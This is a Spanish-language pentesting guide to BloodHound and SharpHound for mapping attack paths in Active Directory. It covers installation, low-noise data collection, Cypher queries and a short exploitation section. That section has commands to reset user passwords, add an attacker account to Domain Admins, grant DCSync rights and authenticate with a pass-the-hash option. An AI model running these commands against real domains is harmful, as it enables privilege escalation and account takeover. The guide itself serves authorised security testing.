# 🩸 BloodHound: visualización de rutas de ataque en Active Directory

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Rutas de ataque en AD
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Rutas de ataque">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Grafo">
</p>

> **Precisiones de versión:** el original combina BloodHound Legacy y Community Edition (CE); CE significa edición comunitaria, distinta de Enterprise. La aplicación de escritorio, las consultas y sus propiedades, los menús, los recopiladores y los ejemplos de instalación no son intercambiables entre versiones. CE usa PostgreSQL para los datos de la aplicación y admite motores de grafo PostgreSQL o Neo4j; «no Neo4j» no es una regla general. Véase la [instalación oficial](https://bloodhound.specterops.io/get-started/custom-installation). En SharpHound, ejecutar sin opciones usa `Default`, no `All`; la tabla del original simplifica ese conjunto. Las opciones, su escritura y los métodos disponibles dependen de la versión; `--skipdns` y `-o` deben comprobarse en la ayuda correspondiente. `Stealth` y `DCOnly` reducen determinados contactos, pero no garantizan pasar inadvertido. Véanse las [opciones oficiales](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags). El [recopilador Python](https://github.com/dirkjanm/BloodHound.py) distingue versiones Legacy y CE. Se conservan literalmente los comandos y las etiquetas de consulta del original.

---

## 📋 Índice

- [Qué es BloodHound](#qué-es-bloodhound)
- [Instalación](#instalación)
- [Recopilación con SharpHound](#recopilación-con-sharphound)
- [Uso de la interfaz gráfica de BloodHound](#uso-de-la-interfaz-gráfica-de-bloodhound)
- [Consultas integradas](#consultas-integradas)
- [Consultas Cypher personalizadas](#consultas-cypher-personalizadas)
- [Análisis de rutas de ataque](#análisis-de-rutas-de-ataque)
- [BloodHound CE](#bloodhound-ce)
- [Referencia rápida](#referencia-rápida)

---

<a id="qué-es-bloodhound"></a>

## 🎯 Qué es BloodHound

**BloodHound** utiliza la teoría de grafos para revelar rutas de ataque ocultas en Active Directory. Permite visualizar:

- 🔗 **Rutas de ataque**: vías para alcanzar privilegios de administrador del dominio (Domain Admin)
- 👤 **Relaciones entre usuarios**: pertenencia a grupos y sesiones
- 💻 **Relaciones de confianza de los equipos**: derechos de administración y sesiones
- 🔓 **Errores de configuración**: permisos que se pueden explotar
- 🎯 **Objetivos de alto valor**: cuentas críticas

### Componentes

| Componente | Descripción |
|-----------|-------------|
| **BloodHound** | Interfaz gráfica de visualización (basada en Neo4j) |
| **SharpHound** | Recopilador de datos (.exe o .ps1) |
| **Neo4j** | Motor de base de datos de grafos |
| **BloodHound CE** | Nueva edición de nube/empresa (véase la precisión sobre CE) |

---

<a id="instalación"></a>

## 🚀 Instalación

### Kali Linux

```bash
# Instalar BloodHound
sudo apt update
sudo apt install bloodhound

# Instalar Neo4j
sudo apt install neo4j

# Iniciar Neo4j
sudo neo4j start

# Acceder al navegador de Neo4j: http://localhost:7474
# Credenciales predeterminadas: neo4j / neo4j (cambiarlas en el primer inicio de sesión)

# Inicio de BloodHound
bloodhound
```

### Windows

```powershell
# Descargar desde las versiones publicadas en GitHub
https://github.com/BloodHoundAD/BloodHound/releases

# Instalar Neo4j Community Edition
https://neo4j.com/download/

# Iniciar Neo4j
# Ejecutar como administrador e iniciar el servicio

# Ejecutar BloodHound.exe
```

### Docker (recomendado)

```bash
# Neo4j con una configuración preparada para BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Esperar a que se inicie y, después, ejecutar BloodHound
bloodhound
```

---

<a id="recopilación-con-sharphound"></a>

## 📡 Recopilación con SharpHound

### Descarga de SharpHound

```bash
# Desde las versiones publicadas de BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Archivos:
# - SharpHound.exe (ejecutable independiente)
# - SharpHound.ps1 (PowerShell)
```

### Recopilación básica

```powershell
# Ejecutar SharpHound (según el original: todos los métodos de forma predeterminada; véase la precisión)
.\SharpHound.exe

# Especificar el dominio
.\SharpHound.exe -d domain.local

# Especificar la salida
.\SharpHound.exe -o C:\Temp\

# Versión de PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Métodos de recopilación

```powershell
# Todos los métodos de recopilación
.\SharpHound.exe -c All

# Métodos específicos
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Detalles de los métodos de recopilación

| Método | Descripción | Ruido |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | Bajo |
| All | Todos los datos | Alto |
| Session | Usuarios con sesiones iniciadas | Medio |
| LocalGroup | Miembros de grupos locales | Medio |
| ACL | Permisos de las listas de control de acceso (ACL) | Bajo |
| DCOnly | Recopilación solo desde el controlador de dominio (DC) | Muy bajo |
| Group | Pertenencia a grupos | Bajo |
| Trusts | Relaciones de confianza entre dominios | Bajo |

### Recopilación discreta

```powershell
# Modo discreto (más lento, menos ruido)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Sin resolución DNS
.\SharpHound.exe --skipdns

# Pausa entre solicitudes
.\SharpHound.exe --throttle 1000
```

### Recopilación en bucle (sesiones)

```powershell
# Recopilar sesiones a lo largo del tiempo
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Bucle con intervalo
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### Desde Linux (bloodhound.py)

```bash
# Instalar
pip install bloodhound

# Ejecutar la recopilación
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Con un hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a id="uso-de-la-interfaz-gráfica-de-bloodhound"></a>

## 🖥️ Uso de la interfaz gráfica de BloodHound

### Inicio de BloodHound

```bash
# 1. Iniciar Neo4j
sudo neo4j start

# 2. Esperar a Neo4j (comprobar http://localhost:7474)

# 3. Iniciar BloodHound
bloodhound

# 4. Iniciar sesión
# URL: bolt://localhost:7687
# Nombre de usuario: neo4j
# Contraseña: (tu contraseña)
```

### Importación de datos

```
1. Hacer clic en "Upload Data" (cargar datos; icono de carpeta)
2. Seleccionar el archivo .zip generado por SharpHound
3. Esperar a que termine la importación
4. Los datos aparecen en el grafo
```

### Descripción de la interfaz

| Sección | Descripción |
|---------|-------------|
| **Search** | Buscar usuarios, equipos y grupos |
| **Analysis** | Consultas predefinidas |
| **Filters** | Visibilidad de relaciones y nodos |
| **Graph** | Representación visual |
| **Node Info** | Detalles del elemento seleccionado |

### Navegación

```
- Clic izquierdo: seleccionar un nodo
- Clic derecho: abrir el menú contextual
- Rueda del ratón: acercar o alejar
- Arrastrar: desplazar la vista
- Ctrl+Click: añadir a la selección
```

---

<a id="consultas-integradas"></a>

## 🔍 Consultas integradas

### Información del dominio

```
- Find all Domain Admins — Buscar todos los administradores del dominio
- Find all Domain Controllers — Buscar todos los controladores de dominio
- Find high value targets — Buscar objetivos de alto valor
- Map Domain Trusts — Representar las relaciones de confianza entre dominios
```

### Rutas más cortas

```
- Shortest Paths to Domain Admins — Rutas más cortas hasta administradores del dominio
- Shortest Path from Owned Principals — Ruta más corta desde entidades controladas
- Shortest Path to High Value Targets — Ruta más corta hasta objetivos de alto valor
- Shortest Path to Unconstrained Delegation — Ruta más corta hasta una delegación sin restricciones
```

### Kerberos

```
- Find Kerberoastable Accounts — Buscar cuentas susceptibles a Kerberoasting
- Find AS-REP Roastable Users — Buscar usuarios susceptibles a AS-REP Roasting
- Shortest Path from Kerberoastable Users — Ruta más corta desde usuarios susceptibles a Kerberoasting
- Find Principals with Unconstrained Delegation — Buscar entidades con delegación sin restricciones
```

### Análisis de ACL

```
- Find Principals with DCSync Rights — Buscar entidades con derechos de DCSync
- Find Dangerous Rights for Domain Users — Buscar derechos peligrosos para los usuarios del dominio
- Find Users with Foreign Domain Group Membership — Buscar usuarios pertenecientes a grupos de otros dominios
```

### Equipos

```
- Find Computers with Unsupported OS — Buscar equipos con sistemas operativos sin soporte
- Find Computers where Domain Users are Local Admin — Buscar equipos donde los usuarios del dominio son administradores locales
- Find Computers with Sessions of High Value Users — Buscar equipos con sesiones de usuarios de alto valor
```

### GPO

```
- Find all GPO Owned by Owned Principals — Buscar todas las GPO propiedad de entidades controladas
- Find GPO Affecting High Value Targets — Buscar GPO que afectan a objetivos de alto valor
```

---

<a id="consultas-cypher-personalizadas"></a>

## 📝 Consultas Cypher personalizadas

### Consultas básicas

```cypher
// Buscar todos los usuarios
MATCH (u:User) RETURN u

// Buscar todos los equipos
MATCH (c:Computer) RETURN c

// Buscar todos los administradores del dominio
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Buscar todos los controladores de dominio
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Consultas de sesiones

```cypher
// Buscar dónde tienen sesiones los administradores del dominio
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Buscar usuarios con sesiones en varios equipos
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Consultas de rutas

```cypher
// Ruta más corta hasta un administrador del dominio
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Todas las rutas hasta un administrador del dominio (límite de 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Rutas desde entidades controladas (owned principals)
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### Consultas de ACL

```cypher
// Usuarios con derechos de DCSync
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Usuarios que pueden restablecer contraseñas
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Usuarios con GenericAll sobre equipos
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Consultas de Kerberos

```cypher
// Usuarios susceptibles a Kerberoasting con una ruta hasta un administrador del dominio (DA)
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Usuarios susceptibles a AS-REP Roasting
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Equipos con delegación sin restricciones
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### Objetivos de alto valor

```cypher
// Marcar objetivos de alto valor
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Buscar rutas hasta objetivos de alto valor
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

<a id="análisis-de-rutas-de-ataque"></a>

## 🎯 Análisis de rutas de ataque

### Búsqueda de rutas de ataque

```
1. Buscar el nodo inicial (usuario comprometido)
2. Hacer clic derecho → "Mark as Owned" (marcar como controlado)
3. Ejecutar la consulta "Shortest Path from Owned Principals" (ruta más corta desde entidades controladas)
4. Analizar las relaciones de la ruta
```

### Relaciones de ataque habituales

| Relación | Método de ataque |
|------|---------------|
| **MemberOf** | Pertenencia a un grupo |
| **AdminTo** | Derechos de administrador local |
| **HasSession** | Obtención de credenciales |
| **CanRDP** | Acceso por RDP |
| **CanPSRemote** | Acceso remoto con PowerShell |
| **ExecuteDCOM** | Ejecución mediante DCOM |
| **GenericAll** | Control total |
| **GenericWrite** | Modificar el objeto |
| **WriteOwner** | Cambiar el propietario |
| **WriteDacl** | Modificar la ACL |
| **ForceChangePassword** | Restablecer la contraseña |
| **AddMember** | Añadir al grupo |
| **AllExtendedRights** | DCSync, etc. |
| **GetChanges** | DCSync (parte 1) |
| **GetChangesAll** | DCSync (parte 2) |

### Explotación de las relaciones de ataque

#### GenericAll sobre un usuario

```powershell
# Restablecer la contraseña
net user targetuser NewP@ssw0rd /domain

# O con PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll sobre un equipo

```powershell
# Ataque de delegación restringida basada en recursos (RBCD)
# Usar Rubeus + PowerMad
```

#### ForceChangePassword

```powershell
# Restablecer la contraseña
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Añadir el usuario al grupo
net group "Domain Admins" attackeruser /add /domain

# O con PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Añadir derechos de DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

<a id="bloodhound-ce"></a>

## 🆕 BloodHound CE

### Acerca de BloodHound CE

**BloodHound Community Edition** es la nueva versión:
- Interfaz web moderna
- Motor de base de datos PostgreSQL (en lugar de Neo4j, según el original; véase la precisión)
- API REST
- Mayor rendimiento

### Instalación

```bash
# Docker Compose (recomendado)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Acceso: http://localhost:8080
# Credenciales predeterminadas: admin / (consultar los registros de Docker)
```

### SharpHound para CE

```powershell
# Descargar un recopilador compatible con CE
# Desde las versiones publicadas de BloodHound CE

# Ejecutar la recopilación (misma sintaxis)
.\SharpHound.exe -c All
```

---

<a id="referencia-rápida"></a>

## 📊 Referencia rápida

### Comandos de SharpHound

| Comando | Descripción |
|---------|-------------|
| `.\SharpHound.exe` | Recopilación predeterminada |
| `.\SharpHound.exe -c All` | Todos los métodos |
| `.\SharpHound.exe -c DCOnly` | Solo el DC (recopilación discreta) |
| `.\SharpHound.exe -c Session --loop` | Recopilación de sesiones en bucle |
| `.\SharpHound.exe -d domain.local` | Especificar el dominio |
| `.\SharpHound.exe --stealth` | Modo discreto |

### Consultas habituales

| Consulta | Finalidad |
|-------|---------|
| Find all Domain Admins | Identificar miembros de Domain Admins |
| Shortest Path to DA | Buscar una ruta de ataque |
| Kerberoastable Users | Buscar nombres principales de servicio (SPN) para Kerberoasting |
| AS-REP Roastable | Usuarios sin preautenticación |
| Unconstrained Delegation | Abuso de la delegación |
| DCSync Rights | Buscar entidades con derechos de DCSync |

### Flujo de análisis

```
1. Recopilar datos con SharpHound
2. Importar los datos en BloodHound
3. Marcar las entidades controladas
4. Ejecutar "Shortest Path from Owned" (ruta más corta desde entidades controladas)
5. Analizar las relaciones de ataque
6. Ejecutar los ataques
7. Marcar las nuevas entidades controladas
8. Repetir
```

### Archivos clave

```
Salida de SharpHound:
- *_BloodHound.zip (datos JSON)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Recursos

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [Documentación de BloodHound](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Guías relacionadas
- [Mimikatz](../../Mimikatz/translations/README.es.md)
- [PowerShell](../../PowerShell/translations/README.es.md)
- [Escalada de privilegios en Windows](../../Windows-PrivEsc/translations/README.es.md)

---

<p align="center">
  <b>🩸 ¡Encuentra tu ruta hasta administrador del dominio!</b><br>
  <i>BloodHound: el mejor aliado de quien realiza pruebas de penetración en AD</i>
</p>
